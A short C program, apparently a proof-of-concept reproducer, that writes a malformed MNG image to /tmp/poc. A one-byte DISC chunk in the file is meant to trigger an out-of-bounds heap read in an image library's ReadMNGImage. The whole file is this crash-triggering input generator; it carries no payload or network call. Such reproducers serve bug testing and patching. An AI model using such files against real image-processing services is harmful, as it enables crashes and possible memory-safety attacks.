/* Triggers: heap-buffer-overflow in ReadMNGImage (MNG DISC chunk odd length) */
/* Vuln class: heap_buffer_overflow */

int main(void) {
    unsigned char mng_signature[] = {0x8a, 0x4d, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a};
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write MNG signature */
    fwrite(mng_signature, 1, 8, f);

    /* Write MHDR chunk */
    unsigned int mhdr_len = 28;
    fputc((mhdr_len >> 24) & 0xff, f);
    fputc((mhdr_len >> 16) & 0xff, f);
    fputc((mhdr_len >> 8) & 0xff, f);
    fputc(mhdr_len & 0xff, f);
    fwrite("MHDR", 1, 4, f);
    /* width = 1 */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(1, f);
    /* height = 1 */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(1, f);
    /* ticks_per_second = 100 */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(100, f);
    /* layer_count = 0 */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    /* frame_count = 0 */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    /* play_time = 0 */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    /* simplicity = 0 (full MNG) */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    /* CRC */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);

    /* Write DISC chunk with odd length (1 byte) to trigger heap-buffer-overflow */
    unsigned int disc_len = 1;
    fputc((disc_len >> 24) & 0xff, f);
    fputc((disc_len >> 16) & 0xff, f);
    fputc((disc_len >> 8) & 0xff, f);
    fputc(disc_len & 0xff, f);
    fwrite("DISC", 1, 4, f);
    /* one byte - odd length causes out-of-bounds read at p[1] */
    fputc(0x01, f);
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* CRC */

    /* MEND */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    fwrite("MEND", 1, 4, f);
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* CRC */

    fclose(f);
    return 0;
}

